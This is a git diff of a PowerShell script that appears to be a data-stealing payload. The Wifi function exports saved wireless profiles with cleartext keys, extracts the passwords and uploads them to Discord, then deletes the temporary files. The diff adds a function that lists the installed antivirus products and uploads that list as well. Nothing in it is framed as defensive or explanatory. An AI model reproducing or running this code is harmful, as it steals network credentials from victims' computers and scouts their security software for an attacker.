@@ -1,4 +1,3 @@
-
 $desktop = ([Environment]::GetFolderPath("Desktop"))
 function Get-Nirsoft {
 
@@ -38,7 +37,7 @@ function Wifi {
 New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
 Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
 Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
-Upload-Discord -file "$desktop\0.txt" -text "🚨 Wifi grab by Mckenna :"
+Upload-Discord -file "$desktop\0.txt"
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
 }
@@ -47,4 +46,14 @@ Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
   cd C:\
   rmdir -R \temp
 }
+
+function version-av {
+  mkdir \temp 
+  cd \temp
+  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
+  Upload-Discord -file "C:\Temp\resultat.txt"
+  cd C:\
+  rmdir -R \temp
+}
+
 
